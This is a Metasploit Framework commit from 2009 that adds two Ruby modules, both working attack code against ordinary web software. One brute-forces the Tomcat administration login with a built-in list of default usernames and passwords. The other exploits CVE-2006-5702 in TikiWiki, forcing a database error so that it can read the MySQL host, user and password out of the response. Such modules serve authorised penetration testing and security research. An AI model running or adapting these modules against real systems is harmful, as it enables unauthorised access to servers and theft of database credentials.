ff8323e6d24ba6eeb6244dfe6e735c544b0282d5
Mario Ceballos <mc@metasploit.com>
2009-01-21 12:51:30 +0000

    added modules from Matteo Cantoni.
    git-svn-id: file:///home/svn/framework3/trunk@6170 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/auxiliary/admin/http/tomcat_administration.rb
@@ -0,0 +1,132 @@
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::HttpClient
+	include Msf::Auxiliary::WMAPScanServer
+	include Msf::Auxiliary::Scanner
+
+	def initialize
+		super(
+			'Name'        => 'Tomcat Administration Tool default access',
+			'Version'     => '$Revision: $',
+			'Description' => 'Detect Tomcat Administration Tool default access.',
+			'References'  =>
+				[
+					['URL', 'http://tomcat.apache.org/'],
+				],
+			'Author'      => 'Matteo Cantoni <goony[at]nothink.org>',
+			'License'     => MSF_LICENSE
+		)
+	
+		register_options(
+			[
+				Opt::RPORT(8180),
+				OptString.new('TOMCAT_USER', [ false, 'The username to authenticate as', '']),
+				OptString.new('TOMCAT_PASS', [ false, 'The password for the specified username', '']),
+				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request", 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
+			], self.class)
+	end
+
+	def run_host(ip)
+
+		begin
+			res = send_request_raw({
+				'method'  => 'GET',
+				'uri'     => '/',
+			}, 25)
+
+			if (res and res.code == 200)
+
+				ver = ""
+	
+				if res.body.match(/<title>Apache Tomcat\/(.*)<\/title>/)
+					ver = "Apache Tomcat/" + $1
+				end
+
+				user = datastore['TOMCAT_USER'].to_s
+				pass = datastore['TOMCAT_PASS'].to_s
+
+				if user.length == 0
+					default_usernames = ['admin','manager','role1','root','tomcat']
+				else
+					default_usernames = [user]
+				end
+
+				if pass.length == 0
+					default_passwords = ['admin','manager','role1','root','tomcat']
+				else
+					default_passwords = [pass]
+				end
+
+				default_usernames.each do |username|
+					default_passwords.each do |password|
+
+						res = send_request_raw({
+							'method'  => 'GET',
+							'uri'     => '/admin/',
+						}, 25)
+
+						if (res and res.code == 200)
+
+							if (res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/JSESSIONID=(.*);(.*)/i))
+					
+								jsessionid = $1
+		
+								post_data = "j_username=#{username}&j_password=#{password}"
+	
+								res = send_request_cgi({
+									'uri'          => '/admin/j_security_check',
+									'method'       => 'POST',
+               	 	       		 				'content-type' => 'application/x-www-form-urlencoded',
+									'cookie'       => "JSESSIONID=#{jsessionid}",
+									'data'         => post_data,
+								}, 25)
+
+								if (res.code == 302)
+
+									res = send_request_cgi({
+										'uri'     => "/admin/",
+										'method'  => 'GET',
+										'cookie'  => "JSESSIONID=#{jsessionid}",
+									}, 25)
+			
+									if (res.code == 302)
+
+										res = send_request_cgi({
+											'uri'     => "/admin/frameset.jsp",
+											'method'  => 'GET',
+											'cookie'  => "JSESSIONID=#{jsessionid}",
+										}, 25)
+	
+										if (res.code == 200)
+											print_status("http://#{target_host}:#{rport}/admin [#{res.headers['Server']}] [#{ver}] [Tomcat Server Administration] [#{username}/#{password}]")
+										end
+			
+										# LogOut
+										res = send_request_cgi({
+											'uri'          => '/admin/logOut.do',
+											'method'       => 'GET',
+											'cookie'       => "JSESSIONID=#{jsessionid}",
+										}, 25)
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+
+			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			rescue ::Timeout::Error, ::Errno::EPIPE
+		end
+	end
+end
---
+++ modules/auxiliary/admin/tikiwiki/tikidblib.rb
@@ -0,0 +1,120 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'TikiWiki information disclosure',
+			'Description'    => %q{
+				A vulnerability has been reported in Tikiwiki, which can be exploited by
+				a anonymous user to dump the MySQL user & passwd just by creating a mysql
+				error with the "sort_mode" var.
+				The vulnerability has been reported in Tikiwiki version 1.9.5.
+			},
+			'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: $',
+			'References'     =>
+				[
+					['OSVDB', '30172'],
+					['BID', '20858'],
+					['CVE', '2006-5702'],
+					['MIL', '2701'],
+					['URL', 'http://secunia.com/advisories/22678/'],
+				],
+			'DisclosureDate' => 'Nov 1 2006',
+			'Actions'        =>
+				[
+					['Download']
+				],
+			'DefaultAction'  => 'Download'
+			))
+
+		register_options(
+			[
+				OptString.new('URI', [true, "TikiWiki directory path", "/tikiwiki"]),
+			], self.class)
+	end
+
+	def run
+		print_status("Establishing a connection to the target...")
+
+		rpath = datastore['URI'] + "/tiki-lastchanges.php?days=1&offset=0&sort_mode="
+	
+		res = send_request_raw({
+			'uri'     => rpath,
+			'method'  => 'GET',
+			'headers' =>
+			{
+				'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
+				'Connection' => 'Close',
+			}
+		}, 25)
+
+		if (res and res.message == "OK")
+			print_status("Get informations about database...")
+
+			n = 0
+			c = 0
+
+			infos = res.body.split(/\r|\n/)
+			infos.each do |row|
+				if (c < 6)
+					if (row.match(/\["file"\]=>/))
+						c+=1
+						x = n + 1
+						y = infos[x].match(/string\(\d+\) "(.*)"/m)
+						print_status("Install path : #{y[1]}") 
+					end
+					if (row.match(/\["databaseType"\]=>/))
+						c+=1
+						x = n + 1
+						y = infos[x].match(/string\(\d+\) "(.*)"/m)
+						print_status("DB type      : #{y[1]}") 
+					end
+					if (row.match(/\["database"\]=>/))
+						c+=1
+						x = n + 1
+						y = infos[x].match(/string\(\d+\) "(.*)"/m)
+						print_status("DB name      : #{y[1]}") 
+					end
+					if (row.match(/\["host"\]=>/))
+						c+=1
+						x = n + 1
+						y = infos[x].match(/string\(\d+\) "(.*)"/m)
+						print_status("DB host      : #{y[1]}") 
+					end
+					if (row.match(/\["user"\]=>/))
+						c+=1
+						x = n + 1
+						y = infos[x].match(/string\(\d+\) "(.*)"/m)
+						print_status("DB user      : #{y[1]}") 
+					end
+					if (row.match(/\["password"\]=>/))
+						c+=1
+						x = n + 1
+						y = infos[x].match(/string\(\d+\) "(.*)"/m)
+						print_status("DB password  : #{y[1]}") 
+					end
+					n+=1
+				end
+			end
+
+			if (c == 0)
+				print_status("Could not obtain informations about database.")
+			end
+
+		else
+			print_status("No response from the server.")
+		end
+	end
+end
